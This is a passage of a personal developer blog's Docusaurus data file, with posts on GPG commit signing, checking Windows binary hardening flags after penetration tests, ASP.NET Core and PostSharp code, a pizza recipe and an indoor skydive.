Beer](https://jollygoodbeer.co.uk/wp-content/uploads/2016/03/JollyGoodBeer_PSI_Chart_for_60_40_Mixed_Gas.pdf)"},{"id":"/2023/02/05/Teenager-Dog-Training-Session-1","metadata":{"permalink":"/docs/blog/2023/02/05/Teenager-Dog-Training-Session-1","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-02-05-Teenager-Dog-Training-Session-1.md","source":"@site/blog/2023-02-05-Teenager-Dog-Training-Session-1.md","title":"Teenager Dog Training Session 1","description":"We signed Bruce up for teenager dog training.","date":"2023-02-05T00:00:00.000Z","tags":[{"inline":true,"label":"The Dog House By Ingrid","permalink":"/docs/blog/tags/the-dog-house-by-ingrid"},{"inline":true,"label":"Coque","permalink":"/docs/blog/tags/coque"},{"inline":true,"label":"positive/reward based training","permalink":"/docs/blog/tags/positive-reward-based-training"}],"readingTime":0.08,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Teenager Dog Training Session 1","authors":["mark-burton"],"tags":["The Dog House By Ingrid","Coque","positive/reward based training"],"description":"We signed Bruce up for teenager dog training.","date":"2023-02-05"},"unlisted":false,"prevItem":{"title":"Brew Day","permalink":"/docs/blog/2023/04/22/brew-day"},"nextItem":{"title":"Signing Git Commits in VS Code and Visual Studio","permalink":"/docs/blog/2023/01/20/Signing-Git-Commits-in-VSCode-and-VisualStudio"}},"content":"With the dog on your left, lead in right hand and treat in left hand."},{"id":"/2023/01/20/Signing-Git-Commits-in-VSCode-and-VisualStudio","metadata":{"permalink":"/docs/blog/2023/01/20/Signing-Git-Commits-in-VSCode-and-VisualStudio","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2023-01-20-Signing-Git-Commits-in-VSCode-and-VisualStudio.md","source":"@site/blog/2023-01-20-Signing-Git-Commits-in-VSCode-and-VisualStudio.md","title":"Signing Git Commits in VS Code and Visual Studio","description":"I have recently read a number of PenTest reports and investigated and fixed the vulnerabilities.","date":"2023-01-20T00:00:00.000Z","tags":[{"inline":true,"label":"VS Code","permalink":"/docs/blog/tags/vs-code"},{"inline":true,"label":"Visual Studio","permalink":"/docs/blog/tags/visual-studio"},{"inline":true,"label":"Git","permalink":"/docs/blog/tags/git"},{"inline":true,"label":"gpg","permalink":"/docs/blog/tags/gpg"}],"readingTime":3.31,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Signing Git Commits in VS Code and Visual Studio","authors":["mark-burton"],"tags":["VS Code","Visual Studio","Git","gpg"],"description":"I have recently read a number of PenTest reports and investigated and fixed the vulnerabilities.","date":"2023-01-20"},"unlisted":false,"prevItem":{"title":"Teenager Dog Training Session 1","permalink":"/docs/blog/2023/02/05/Teenager-Dog-Training-Session-1"},"nextItem":{"title":"Notes From Addressing Penetration Test Findings","permalink":"/docs/blog/2022/04/11/Notes-from-addressing-pentest-results"}},"content":"gpg --full-generate-key\\n```  You will be asked 3 questions, the first is the kind of key, based on [the GitHub docs](https:/docs.github.comenauthenticationmanaging-commit-signature-verificationgenerating-a-new-gpg-key) choose option 1, RSA.  ``` powershell\\ngpg (GnuPG) 2.4.0; Copyright (C) 2021 g10 Code GmbH\\nThis is free software: you are free to change and redistribute it.\\nThere is NO WARRANTY, to the extent permitted by law.  Please select what kind of key you want:  (1) RSA and RSA  (2) DSA and Elgamal  (3) DSA (sign only)  (4) RSA (sign only)  (9) ECC (sign and encrypt) *default*  (10) ECC (sign only)  (14) Existing key from card\\nYour selection?\\n```  Again following [the GitHub docs](https:/docs.github.comenauthenticationmanaging-commit-signature-verificationgenerating-a-new-gpg-key) the key must be at least 4,096 bits long, so the maximum you can choose.  ``` powershell  RSA keys may be between 1024 and 4096 bits long.\\nWhat keysize do you want? (3072) 4096\\nRequested keysize is 4096 bits  ```  Next, choose how long the key should be valid for, again following [the GitHub docs](https:/docs.github.comenauthenticationmanaging-commit-signature-verificationgenerating-a-new-gpg-key) choose the default, which is no expiration  ``` powershell\\nPlease specify how long the key should be valid.  0 = key does not expire  &lt;n&gt;  = key expires in n days  &lt;n&gt;w = key expires in n weeks  &lt;n>m = key expires in n months  &lt;n&gt;y = key expires in n years\\nKey is valid for? (0)\\n```  Finally, add your user identity, it is important that the email address matches the git repo email.  ``` powershell  We need to generate a lot of random bytes. It is a good idea to perform\\nsome other action (type on the keyboard, move the mouse, utilize the\\ndisks) during the prime generation; this gives the random number\\ngenerator a better chance to gain enough entropy.\\nWe need to generate a lot of random bytes. It is a good idea to perform\\nsome other action (type on the keyboard, move the mouse, utilize the\\ndisks) during the prime generation; this gives the random number\\ngenerator a better chance to gain enough entropy.\\ngpg: directory \'C:\\\\\\\\Users\\\\\\\\xxxxx\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\gnupg\\\\\\\\openpgp-revocs.d\' created\\ngpg: revocation certificate stored as \'C:\\\\\\\\Users\\\\\\\\xxxxxx\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\gnupg\\\\\\\\openpgp-revocs.d\\\\\\\\36E97B0FB71E5EEEC2244F4AFDE4A9B5B04820D7.rev\'\\npublic and secret key created and signed.\\npub  rsa4096 2023-01-29 [SC]  36E97B0FB71E5EEEC2244F4AFDE4A9B5B04820D7\\nuid  markb &lt;mark@example.com&gt;\\nsub  rsa4096 2023-01-29 [E]\\n```  ## Final git config  ``` powershell  PS C:\\\\Source\\\\GitRepos\\\\mywyamblog&gt; git config --global -l\\n...snip...\\nuser.signingkey=N07AR33A1S1GN1NGK3Y!\\ngpg.program=c:Program Files (x86)GnuPGbingpg.exe\\ncommit.gpgsign=true\\n...snip...  ```  ## Usage in VS Code  Continue to use VS Code normally, when you do a commit you will be prompted for the passphrase for the gpg key.  ![gpg prompt in VS Code](/img/VSCode_Sign_Commit.png)  ## How often to sign the commits?  Signing every commit can be tedious, the default cache time is 1800 seconds (30 minutes) as per the [Agent Options documentation](https:/www.gnupg.orgdocumentationmanualsgnupgAgent-Options.html).  Although this is not the same answer as running `gpgconf.exe --list-options gpg-agent` which returns 600 seconds and is backed up by a local test.  ``` cmd  PS C:\\\\Users\\\\mburton\\\\.gnupg> gpgconf.exe --list-options gpg-agent\\n...\\ndefault-cache-ttl:24:0:expire cached PINs after N seconds:3:3:N:600::\\nmax-cache-ttl:24:2:set maximum PIN cache lifetime to N seconds:3:3:N:7200::\\nmax-cache-ttl-ssh:24:2:set maximum SSH key lifetime to N seconds:3:3:N:7200::\\nignore-cache-for-signing:8:0:do not use the PIN cache when signing:0:0::::\\n...  ```  The options to change the cache are discussed in this [Super User](https:/superuser.comquestions624343keep-gnupg-credentials-cached-for-entire-user-session) question. Extending the `default-cache-ttl` and `max-cache-ttl` will mean entering the signing key phrase less often.  https:/superuser.comquestions1068980where-is-my-gpgconf-file-on-windows  2 gpg installations because git comes with its own.  14400 is a compromise at 4 hours."},{"id":"/2022/04/11/Notes-from-addressing-pentest-results","metadata":{"permalink":"/docs/blog/2022/04/11/Notes-from-addressing-pentest-results","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2022-04-11-Notes-from-addressing-pentest-results.md","source":"@site/blog/2022-04-11-Notes-from-addressing-pentest-results.md","title":"Notes From Addressing Penetration Test Findings","description":"I have recently read a number of PenTest reports and investigated and fixed the vulnerabilities.","date":"2022-04-11T00:00:00.000Z","tags":[{"inline":true,"label":"PenTest","permalink":"/docs/blog/tags/pen-test"},{"inline":true,"label":"Squirrel","permalink":"/docs/blog/tags/squirrel"},{"inline":true,"label":".NET","permalink":"/docs/blog/tags/net"}],"readingTime":2.15,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Notes From Addressing Penetration Test Findings","authors":["mark-burton"],"tags":["PenTest","Squirrel",".NET"],"description":"I have recently read a number of PenTest reports and investigated and fixed the vulnerabilities.","date":"2022-04-11"},"unlisted":false,"prevItem":{"title":"Signing Git Commits in VS Code and Visual Studio","permalink":"/docs/blog/2023/01/20/Signing-Git-Commits-in-VSCode-and-VisualStudio"},"nextItem":{"title":"How To Create a Custom UserStore in ASP.NET Core 6","permalink":"/docs/blog/2021/12/20/create-a-custom-userstore-net6"}},"content":"I have seen a few methods of identifying the language used to develop an application, first of which is [CFF Explorer](https:/ntcore.com?page_id=388).  ### CFF Explorer  This has been used each time the binary has been misidentified as C++ when it was actually written in csharp, however it is not a fault with CFF Explorer, it is simply that the wrong executable had been analysed.  ![Select file](/img/CFF_Explorer_Squirrel_Executable_Location.png)\\n![File Details](/img/CFF_Explorer_Squirrel_Executable_Details.png)  ![Select file](/img/CFF_Explorer_WPFApp_Executable_Location.png)\\n![File Details](/img/CFF_Explorer_WPFApp_Executable_Details.png)  ### Grep on WSL  While I am working Windows to build a WPF application I can still use useful Linux commands like `file` and `grep` through WSL to find out more about a file.  ``` bash\\nmburton@zitherldwx01:mntc/UsersanonAppDataLocalWpfSampleAppFullFramework$ ls\\nUpdate.exe  WpfApp2FullFramework.exe  app-1.0.0  packages  mburton@zitherldwx01:mntc/UsersanonAppDataLocalWpfSampleAppFullFramework$ file WpfApp2FullFramework.exe\\nWpfApp2FullFramework.exe: PE32 executable (GUI) Intel 80386, for MS Windows  mburton@zitherldwx01:mntc/UsersanonAppDataLocalWpfSampleAppFullFramework$ cd app-1.0.0/  mburton@zitherldwx01:mntc/UsersanonAppDataLocalWpfSampleAppFullFrameworkapp-1.0.0$ file WpfApp2FullFramework.exe\\nWpfApp2FullFramework.exe: PE32 executable (GUI) Intel 80386 Mono.Net assembly, for MS Windows  mburton@zitherldwx01:mntc/UsersanonAppDataLocalWpfSampleAppFullFrameworkapp-1.0.0$ file *.dll | grep \\"Mono.Net\\" | wc -l\\n10  mburton@zitherldwx01:mntc/UsersanonAppDataLocalWpfSampleAppFullFrameworkapp-1.0.0$ ls *.dll\\nDeltaCompressionDotNet.MsDelta.dll  Mono.Cecil.Mdb.dll  Mono.Cecil.dll  Squirrel.dll\\nDeltaCompressionDotNet.PatchApi.dll  Mono.Cecil.Pdb.dll  NuGet.Squirrel.dll\\nDeltaCompressionDotNet.dll  Mono.Cecil.Rocks.dll  SharpCompress.dll  mburton@zitherldwx01:mntc/UsersanonAppDataLocalWpfSampleAppFullFrameworkapp-1.0.0$ file *.dll | grep \\"Mono.Net\\" | wc -l\\n10\\n```html\\n## Binary Security  Having identified the binary the reports then flag security options which have not been used. This can be done using a PowerShell Module [PESecurity](https:/github.comNetSPIPESecurity.git)  <p className=\\"alert alert-warning\\" />WARNING!!! Use [PESecurity](https:/github.comNetSPIPESecurity.git) at your own risk, read the code yourself before you use it!<<p className=\\"alert alert-warning\\"> />\\n\\n<p> <p>  ``` powershell  PS C:\\\\Source\\\\GitRepos\\\\PESecurity> Get-PESecurity -file $env:LOCALAPPDATA\\\\WpfSampleAppFullFramework\\\\app-1.0.0\\\\WpfApp2FullFramework.exe  FileName  : $env:LOCALAPPDATA\\\\WpfSampleAppFullFramework\\\\app-1.0.0\\\\WpfApp2FullFramework.exe\\nARCH  : I386\\nDotNET  : True\\nASLR  : True\\nDEP  : True\\nAuthenticode  : False\\nStrongNaming  : False\\nSafeSEH  : NA\\nControlFlowGuard : NA\\nHighentropyVA  : NA\\n```  ``` powershell\\nPS C:\\\\Source\\\\GitRepos\\\\PESecurity> Get-PESecurity -file $env:LOCALAPPDATA\\\\WpfSampleAppFullFramework\\\\WpfApp2FullFramework.exe  FileName  : $env:LOCALAPPDATA\\\\WpfSampleAppFullFramework\\\\WpfApp2FullFramework.exe\\nARCH  : I386\\nDotNET  : False\\nASLR  : True\\nDEP  : True\\nAuthenticode  : False\\nStrongNaming  : NA\\nSafeSEH  : True\\nControlFlowGuard : False\\nHighentropyVA  : NA\\n```  ## The Cause of the misidentification  The application installer is built using [Squirrel](https:/github.comSquirrelSquirrel.Windows), the file being opened in `CFF Explorer` is part of the Squirrel installer as described in the [Installing Documentation](https:/github.comSquirrelSquirrel.Windowsblobdevelopdocsgetting-started4-installing.md).  The actual application executable is in the application version subdirectory `app-n.n.n`.  ## How to fix it?  I had a very constructive discussion with [caesay](https:/github.comcaesay) who is one of the maintainers of [Clowd.Squirrel](https:/github.comclowdClowd.Squirrel), a fork of [Squirrel.Windows](https:/github.comSquirrelSquirrel.Windows) moments after our discussion this commit [Enable ControlFlowGuard for Setup.exe](https:/github.comclowdClowd.Squirrelcommit5cb8fdd8be220167e65af5f43a521c4307bd783a) was made."},{"id":"/2021/12/20/create-a-custom-userstore-net6","metadata":{"permalink":"/docs/blog/2021/12/20/create-a-custom-userstore-net6","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2021-12-20-create-a-custom-userstore-net6.md","source":"@site/blog/2021-12-20-create-a-custom-userstore-net6.md","title":"How To Create a Custom UserStore in ASP.NET Core 6","description":"UserStore with complex IdentityServer and AzMan permissions","date":"2021-12-20T00:00:00.000Z","tags":[{"inline":true,"label":"ASP.NET CORE","permalink":"/docs/blog/tags/asp-net-core"},{"inline":false,"label":"Identity","permalink":"/docs/blog/tags/identity","description":"ASP.NET Core Identity"},{"inline":false,"label":"Recipes","permalink":"/docs/blog/tags/recipes","description":"Food and cooking recipes"}],"readingTime":0.24,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"How To Create a Custom UserStore in ASP.NET Core 6","authors":["mark-burton"],"tags":["ASP.NET CORE","Identity","Recipes"],"description":"UserStore with complex IdentityServer and AzMan permissions","date":"2021-12-20"},"unlisted":false,"prevItem":{"title":"Notes From Addressing Penetration Test Findings","permalink":"/docs/blog/2022/04/11/Notes-from-addressing-pentest-results"},"nextItem":{"title":"Welcome","permalink":"/docs/blog/welcome"}},"content":"```csharp\\nbuilder.Services.AddDbContext<ApplicationDbContext>(options =>\\n  options.UseSqlite(Configuration.GetConnectionString(\\"DefaultConnection\\")));\\n\\nbuilder.Services.AddIdentity<ApplicationUser, IdentityRole>()\\n  .AddEntityFrameworkStores<ApplicationDbContext>()\\n  .AddDefaultTokenProviders();\\n\\nbuilder.Services.AddTransient<IUserStore<ApplicationUser>, DirectUserStore<ApplicationUser>>();\\n```\\n\\nhttps://docs.microsoft.com/en-us/aspnet/core/security/authentication/identity-custom-storage-providers?view=aspnetcore-6.0\\n\\nhttps://github.com/dotnet/AspNetCore.Docs/tree/main/aspnetcore/security/authentication/identity-custom-storage-providers/sample/CustomIdentityProviderSample"},{"id":"welcome","metadata":{"permalink":"/docs/blog/welcome","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2021-08-26-welcome/index.md","source":"@site/blog/2021-08-26-welcome/index.md","title":"Welcome","description":"Docusaurus blogging features are powered by the blog plugin.","date":"2021-08-26T00:00:00.000Z","tags":[{"inline":false,"label":"Facebook","permalink":"/docs/blog/tags/facebook","description":"Facebook related content"},{"inline":false,"label":"Hello","permalink":"/docs/blog/tags/hello","description":"Hello world examples"},{"inline":false,"label":"Docusaurus","permalink":"/docs/blog/tags/docusaurus","description":"Docusaurus static site generator"}],"readingTime":0.56,"hasTruncateMarker":true,"authors":[{"name":"S\xe9bastien Lorber","title":"Docusaurus maintainer","url":"https://sebastienlorber.com","imageURL":"https://github.com/slorber.png","key":"slorber","page":null},{"name":"Yangshun Tay","title":"Ex-Meta Staff Engineer, Co-founder GreatFrontEnd","url":"https://linkedin.com/in/yangshun","page":{"permalink":"/docs/blog/authors/yangshun"},"socials":{"x":"https://x.com/yangshunz","linkedin":"https://www.linkedin.com/in/yangshun/","github":"https://github.com/yangshun","newsletter":"https://www.greatfrontend.com"},"imageURL":"https://github.com/yangshun.png","key":"yangshun"}],"frontMatter":{"slug":"welcome","title":"Welcome","authors":["slorber","yangshun"],"tags":["facebook","hello","docusaurus"]},"unlisted":false,"prevItem":{"title":"How To Create a Custom UserStore in ASP.NET Core 6","permalink":"/docs/blog/2021/12/20/create-a-custom-userstore-net6"},"nextItem":{"title":"MDX Blog Post","permalink":"/docs/blog/mdx-blog-post"}},"content":"[Docusaurus blogging features](https://docusaurus.io/docs/blog) are powered by the [blog plugin](https://docusaurus.io/docs/api/plugins/@docusaurus/plugin-content-blog).\\n\\nHere are a few tips you might find useful.\\n\\n\x3c!-- truncate --\x3e\\n\\nSimply add Markdown files (or folders) to the `blog` directory.\\n\\nRegular blog authors can be added to `authors.yml`.\\n\\nThe blog post date can be extracted from filenames, such as:\\n\\n- `2019-05-30-welcome.md`\\n- `2019-05-30-welcome/index.md`\\n\\nA blog post folder can be convenient to co-locate blog post images:\\n\\n![Docusaurus Plushie](./docusaurus-plushie-banner.jpeg)\\n\\nThe blog supports tags as well!\\n\\n**And if you don\'t want a blog**: just delete this directory, and use `blog: false` in your Docusaurus config."},{"id":"mdx-blog-post","metadata":{"permalink":"/docs/blog/mdx-blog-post","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2021-08-01-mdx-blog-post.mdx","source":"@site/blog/2021-08-01-mdx-blog-post.mdx","title":"MDX Blog Post","description":"Blog posts support Docusaurus Markdown features, such as MDX.","date":"2021-08-01T00:00:00.000Z","tags":[{"inline":false,"label":"Docusaurus","permalink":"/docs/blog/tags/docusaurus","description":"Docusaurus static site generator"}],"readingTime":0.27,"hasTruncateMarker":true,"authors":[{"name":"S\xe9bastien Lorber","title":"Docusaurus maintainer","url":"https://sebastienlorber.com","imageURL":"https://github.com/slorber.png","key":"slorber","page":null}],"frontMatter":{"slug":"mdx-blog-post","title":"MDX Blog Post","authors":["slorber"],"tags":["docusaurus"]},"unlisted":false,"prevItem":{"title":"Welcome","permalink":"/docs/blog/welcome"},"nextItem":{"title":"Making pizza in my Ooni Koda 12","permalink":"/docs/blog/2021/07/09/making-pizza-in-my-ooni-koda-12"}},"content":"Blog posts support [Docusaurus Markdown features](https://docusaurus.io/docs/markdown-features), such as [MDX](https://mdxjs.com/).\\n\\n:::tip\\n\\nUse the power of React to create interactive blog posts.\\n\\n:::\\n\\n{/* truncate */}\\n\\nFor example, use JSX to create an interactive button:\\n\\n```js\\n<button onClick={() => alert(\'button clicked!\')}>Click me!</button>\\n```\\n\\n<button onClick={() => alert(\'button clicked!\')}>Click me!</button>"},{"id":"/2021/07/09/making-pizza-in-my-ooni-koda-12","metadata":{"permalink":"/docs/blog/2021/07/09/making-pizza-in-my-ooni-koda-12","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2021-07-09-making-pizza-in-my-ooni-koda-12.md","source":"@site/blog/2021-07-09-making-pizza-in-my-ooni-koda-12.md","title":"Making pizza in my Ooni Koda 12","description":"For Christmas I received a Ooni Koda 12 gas fuelled pizza oven, making fresh pizza is more challenging than it might seem","date":"2021-07-09T00:00:00.000Z","tags":[{"inline":false,"label":"Pizza","permalink":"/docs/blog/tags/pizza","description":"Pizza making and recipes"},{"inline":false,"label":"Ooni","permalink":"/docs/blog/tags/ooni","description":"Pizza oven brand"},{"inline":false,"label":"Recipes","permalink":"/docs/blog/tags/recipes","description":"Food and cooking recipes"}],"readingTime":1.05,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Making pizza in my Ooni Koda 12","authors":["mark-burton"],"tags":["Pizza","Ooni","Recipes"],"description":"For Christmas I received a Ooni Koda 12 gas fuelled pizza oven, making fresh pizza is more challenging than it might seem","date":"2021-07-09"},"unlisted":false,"prevItem":{"title":"MDX Blog Post","permalink":"/docs/blog/mdx-blog-post"},"nextItem":{"title":"Centralizing VSTO add in exception management with postsharp 6","permalink":"/docs/blog/2021/06/18/centralizing-vsto-add-in-exception-management-with-postsharp6"}},"content":"I love pizza but nothing you can buy from the shop comes close to freshly made pizza and delivery is usually getting cold by the time it arrives.  Luckily for Christmas I received an Ooni Koda 12 (Thanks Caitriona), just connect the bottle of gas turn it on and after 15 minutes you have a 400\xb0C oven ready to cook a pizza in only 90 seconds.  Ooni have great recipes on their website for [Classic Pizza Dough](https:/eu.ooni.comblogsrecipesclassic-pizza-dough) and [Classic Pizza Sauce](https:/eu.ooni.comblogsrecipesclassic-pizza-sauce) but the dough recipe doesn\'t seem to be quite right for the Ooni Koda 12, the bases just seem too big for the peels, but this could be my lack of knowledge with making bases, but I find a little less is better and I only usually want 2 pizzas each time I use the oven.  ## My Tweaked Recipe\\nThe proportions remain the same, but the accuracy of the proportions are all important.  :::primary\\n242g \u201c00\u201d flour 2.8g instant dried yeast (3.7g active dried yeast, 8g fresh yeast) 48.5ml boiled water 97ml cold water 7.2g salt\\n:::  For everything else follow the [Classic Pizza Dough](https:/eu.ooni.comblogsrecipesclassic-pizza-dough) instructions for 2 perfectly sized pizzas for your Ooni Koda 12."},{"id":"/2021/06/18/centralizing-vsto-add-in-exception-management-with-postsharp6","metadata":{"permalink":"/docs/blog/2021/06/18/centralizing-vsto-add-in-exception-management-with-postsharp6","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2021-06-18-centralizing-vsto-add-in-exception-management-with-postsharp6.md","source":"@site/blog/2021-06-18-centralizing-vsto-add-in-exception-management-with-postsharp6.md","title":"Centralizing VSTO add in exception management with postsharp 6","description":"After much reading it seems you cannot handle exceptions globally in an Office add-in","date":"2021-06-18T00:00:00.000Z","tags":[{"inline":false,"label":"PostSharp","permalink":"/docs/blog/tags/postsharp","description":".NET aspect-oriented programming framework"},{"inline":false,"label":"VSTO","permalink":"/docs/blog/tags/vsto","description":"Visual Studio Tools for Office"}],"readingTime":2.9,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Centralizing VSTO add in exception management with postsharp 6","authors":["mark-burton"],"tags":["PostSharp","VSTO"],"description":"After much reading it seems you cannot handle exceptions globally in an Office add-in","date":"2021-06-18"},"unlisted":false,"prevItem":{"title":"Making pizza in my Ooni Koda 12","permalink":"/docs/blog/2021/07/09/making-pizza-in-my-ooni-koda-12"},"nextItem":{"title":"My First Skydive @ LuxFly","permalink":"/docs/blog/2021/06/11/my-first-skydive"}},"content":"After much reading around trying to find the best way to implement a global exception handler for a VSTO add-in on [social msdn](https:/social.msdn.microsoft.comForumsvstudioen-USc37599d9-21e8-4c32-b00e-926f97c8f639global-exception-handler-for-vs-2008-excel-addin?forum=vsto), [stackoverflow](\\nhttps:/stackoverflow.comquestions12115030catch-c-sharp-wpf-unhandled-exception-in-word-add-in-before-microsoft-displays-e) and the [Add-in Express forum](https:/www.add-in-express.comforumread.php?FID=5&TID=12667) I came across this solution [using postsharp](https:/exceptionalcode.wordpress.com20100217centralizing-vsto-add-in-exception-management-with-postsharp), this was the best solution I found but was 11 years old and relevant to postsharp 2, the library has changed a lot since then and the `PostSharp.Laos` namespace no longer exists as explained the [postsharp support forum](https:/support.postsharp.netrequest21870-postshaplaos-in-version-41).  ## The Solution in PostSharp 6\\nHappily this is still possible with [PostSharp Community](https:/www.postsharp.netgetcommunity) and is well documented in the [postsharp handling exceptions documentation](https:/doc.postsharp.netexception-handling).  First create a class which inherits from `OnExceptionAspect` for example [VstoUnhandledExceptionAttribute](https:/github.comMarkZitherKimaiDotNetblobmainsrcMarkZither.KimaiDotNet.ExcelAddinVstoUnhandledExceptionAttribute.cs).  ``` csharp\\nusing Microsoft.Extensions.Logging;  using PostSharp.Aspects;\\nusing PostSharp.Serialization;  namespace MarkZither.KimaiDotNet.ExcelAddin\\n\\\\\\\\\\\\{  [PSerializable]  public class VstoUnhandledExceptionAttribute : OnExceptionAspect  \\\\{  public override void OnException(MethodExecutionArgs args)  {  ExcelAddin.Globals.ThisAddIn.Logger.LogCritical(args.Exception, \\"Handled by postsharp OnExceptionAspect\\");  args.FlowBehavior = FlowBehavior.Return;  \\\\\\\\}  }\\n}\\n```  This step will vary depending on how you are doing logging in your VSTO Add-In, I chose to use [Microsoft.Extensions.Logging](https:/www.nuget.orgpackagesMicrosoft.Extensions.Logging), while it arrived with [.NET Core](https:/en.wikipedia.orgwiki.NET_Core) it is a .NETStandard 2.0 library and compatible all the way back to .NETFramework 4.6.1.  ``` csharp  private void ThisAddIn_Startup(object sender, System.EventArgs e)\\n\\\\\\\\{  instantiate and configure logging. Using serilog here, to log to console and a text-file.  var loggerFactory = new Microsoft.Extensions.Logging.LoggerFactory();  var loggerConfig = new LoggerConfiguration()  .MinimumLevel.Debug()  .WriteTo.File(\\"c:\\\\\\\\temp\\\\\\\\logs\\\\\\\\myapp.txt\\", rollingInterval: RollingInterval.Day)  .CreateLogger();  loggerFactory.AddSerilog(loggerConfig);  // create logger and put it to work.  var logProvider = loggerFactory.CreateLogger<ThisAddIn />();  logProvider.LogDebug(\\"debiggung\\");  Logger = logProvider;  Configure PostSharp Logging to use Serilog  LoggingServices.DefaultBackend = new MicrosoftLoggingBackend(loggerFactory);  Globals.ThisAddIn.ApiUrl = Settings.Default?.ApiUrl;  Globals.ThisAddIn.ApiUsername = Settings.Default?.ApiUsername;  this.Application.WorkbookActivate += Application_WorkbookActivate;  this.Application.WorkbookOpen += Application_WorkbookOpen;\\n\\\\}\\n```  There is one important line in the logging setup which differs to the [PostSharp Logging documentation](https:/doc.postsharp.netlogging-aspnetcore) at the time of writing, `  LoggingServices.DefaultBackend = new MicrosoftLoggingBackend(loggerFactory);` which needs `using PostSharp.Patterns.Diagnostics.Backends.Microsoft;`. This is also useful for trace logging which I will explain further in the next section.  Now decorate methods or entire classes with the `[VstoUnhandledException]` attribute and every exception will be handled by the `OnException` method.  ## Bonus functionality in PostSharp community\\nAs I had logging working I also made use of the features of [PostSharp Logging](https://www.postsharp.net/logging)\\n\\nFirst add a `postsharp.config` file, to comply with the license it is required to set the [LoggingDeveloperMode to true](https://doc.postsharp.net/logging-license). Be sure it has the Build Action set to Content so that it is copied to the output directory.\\n\\n```xml\\n<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?>\\n<Project xmlns=\\"http://schemas.postsharp.org/1.0/configuration\\">\\n  <Property Name=\\"LoggingDeveloperMode\\" Value=\\"True\\" />\\n</Project>\\n```\\n\\nThis still gives you 24 hours of trace logging after every publish of your VSTO Add-In and full tracing while debugging.\\n\\nTo control what is logged create a class called `GlobalAspects`, this is explained in the [Adding logging to your projects](https://doc.postsharp.net/add-logging) section.\\n\\n```csharp\\nusing PostSharp.Patterns.Diagnostics;\\nusing PostSharp.Extensibility;  [assembly: Log(AttributePriority = 1, AttributeTargetMemberAttributes = MulticastAttributes.Protected | MulticastAttributes.Internal | MulticastAttributes.Public)]\\n[assembly: Log(AttributePriority = 2, AttributeExclude = true, AttributeTargetMembers = \\"get_*\\")]\\n```  Now the logging will contain all the entry and exits from methods along with the parameters which were passed, providing valuable debug information for free for a whole day after pushing out and update to the Add-In."},{"id":"/2021/06/11/my-first-skydive","metadata":{"permalink":"/docs/blog/2021/06/11/my-first-skydive","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2021-06-11-my-first-skydive.md","source":"@site/blog/2021-06-11-my-first-skydive.md","title":"My First Skydive @ LuxFly","description":"All the fun of skydiving without the danger of jumping out of a plane?","date":"2021-06-11T00:00:00.000Z","tags":[{"inline":false,"label":"LuxFly","permalink":"/docs/blog/tags/luxfly","description":"Luxembourg aviation"},{"inline":false,"label":"Skydiving","permalink":"/docs/blog/tags/skydiving","description":"Parachuting and skydiving"}],"readingTime":2.88,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"My First Skydive @ LuxFly","authors":["mark-burton"],"tags":["LuxFly","Skydiving"],"description":"All the fun of skydiving without the danger of jumping out of a plane?","date":"2021-06-11"},"unlisted":false,"prevItem":{"title":"Centralizing VSTO add in exception management with postsharp 6","permalink":"/docs/blog/2021/06/18/centralizing-vsto-add-in-exception-management-with-postsharp6"},"nextItem":{"title":"KimaiDotNet based Office Add-ins","permalink":"/docs/blog/2021/05/29/KimaiDotNet-based-Office-Addins"}},"content":"For a birthday present I received a voucher to do an indoor skydive at [LuxFly](https:/indoorskydive.luen) at the Luxembourg and Belgium border.  Thanks to Covid 19 lockdowns I had another birthday before I could actually make use of the [Falcon9](https:/shop.indoorskydive.lucatalog_66) experience.  ## Arrival\\nAs Covid restrictions were still in place there were not many people there when I arrived, but the staff were very welcoming and efficient finding my booking, checking me in and explaining how things would work.  I was early so had time to watch some experienced people flying around, hovering in a seated position, doing headstands and slow motion backflips, sometimes it reminded me of wire work in a Wuxia movie.  I remember it something like this...\\n\\n<div className=\\"tenor-gif-embed\\" data-postid=\\"9992881\\" data-share-method=\\"host\\" data-width=\\"100%\\" data-aspect-ratio=\\"1.4953271028037383\\"><a href=\\"https://tenor.com/view/miss-me-with-the-bs-gif-9992881\\">Matrix GIF</a> from <a href=\\"https://tenor.com/search/matrix-gifs\\">Matrix GIFs</a></div><script type=\\"text/javascript\\" async src=\\"https://tenor.com/embed.js\\"><\/script>\\n\\nor more far fetched a bit of Money Magic\\n\\n<div className=\\"tenor-gif-embed\\" 